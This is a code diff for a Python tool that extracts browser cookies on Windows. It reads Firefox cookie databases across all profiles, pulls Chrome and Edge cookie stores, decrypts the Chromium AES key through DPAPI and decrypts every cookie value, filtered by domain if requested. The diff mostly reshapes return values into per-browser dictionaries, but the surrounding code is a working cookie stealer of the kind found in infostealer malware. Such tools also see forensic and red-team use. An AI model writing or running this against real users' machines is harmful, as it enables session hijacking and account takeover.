@@ -38,10 +38,7 @@ def _dict_factory(cursor, row):
 
 def _mergeResults(ff: list, edge: list, chrome: list):
     browsers = list(filter(lambda x: len(x), [ff, edge, chrome]))
-    results = {}
-    for k in browsers[0][0].keys():
-        results[k] = [b[0] for b in browsers]
-
+    results = [browser for browser in browsers]
     return json.dumps(results, indent=4, sort_keys=True)
 
 def decryptChromiumCookie(key, value) -> str:
@@ -71,7 +68,7 @@ def getFirefoxCookies(domains: list) -> list:
     Returns:
         An list of users and their Firefox cookies.
     """
-    moz_cookie_list = []
+    moz_cookie_dict = {"Firefox": []}
     user = Path.home()
     for profile in Path(f"{user}\AppData\Roaming\Mozilla\Firefox\Profiles").glob("*"):
         pro_name = profile.parts[-1]
@@ -83,20 +80,19 @@ def getFirefoxCookies(domains: list) -> list:
             conn.row_factory = _dict_factory
             cursor = conn.cursor()
             
-            profile_dict = {"Firefox": {str(pro_name): []}}
+            profile_dict = {str(pro_name): []}
 
             for row in cursor.execute("Select host,path,name,value,expiry from moz_cookies"):
                 if domains:
                     for domain in domains:
                         if row["host"] == domain or row["host"].endswith(f".{domain}"):
-                            profile_dict["Firefox"][pro_name].append(row)
+                            profile_dict[pro_name].append(row)
                             break                                
                 else:
-                    profile_dict["Firefox"][pro_name].append(row)
+                    profile_dict[pro_name].append(row)
 
-            moz_cookie_list.append(profile_dict)
-
-    return moz_cookie_list
+            moz_cookie_dict["Firefox"].append(profile_dict)
+    return moz_cookie_dict
 
 def getChromiumCookies(domains: list, browser: str):
     """Gathers Chromium-based Cookies.
@@ -115,7 +111,7 @@ def getChromiumCookies(domains: list, browser: str):
         COOKIE_PATH = r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
         STATE_PATH = r"AppData\Local\Google\Chrome\User Data\Local State"
 
-    chr_cookie_list = []
+    chr_cookie_dict = {browser: []}
     user = Path.home()
 
     cookie_path = user / COOKIE_PATH
@@ -127,29 +123,28 @@ def getChromiumCookies(domains: list, browser: str):
         conn.row_factory = _dict_factory
         cursor = conn.cursor()
         
-        edge_cookie_list = []
-        profile_dict = {browser: []}
+        cookie_list = []
 
         # Cookies are AES-256 encrypted. Key is DPAPI encrypted.
         enc_key = json.load(open(state_path))["os_crypt"]["encrypted_key"]
         dpapied_key = b64decode(enc_key)
         decrypted_key = win32crypt.CryptUnprotectData(dpapied_key[5:], None, None, None, 0)[1]
         # print(decrypted_key)
-    
+        # print(dpapied_key)
+
         for row in cursor.execute("Select host_key,path,name,encrypted_value AS value,expires_utc from cookies"):
             if domains:
                 for domain in domains:
                     if row["host_key"] == domain or row["host_key"].endswith(f".{domain}"):
                         row["value"] = decryptChromiumCookie(decrypted_key, row["value"])
-                        profile_dict[browser].append(row)
+                        cookie_list.append(row)
                         break
             else:
                 row["value"] = decryptChromiumCookie(decrypted_key, row["value"])
-                profile_dict[browser].append(row)
+                cookie_list.append(row)
             
-        chr_cookie_list.append(profile_dict)
-
-    return chr_cookie_list
+        chr_cookie_dict[browser] = cookie_list
+    return chr_cookie_dict
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
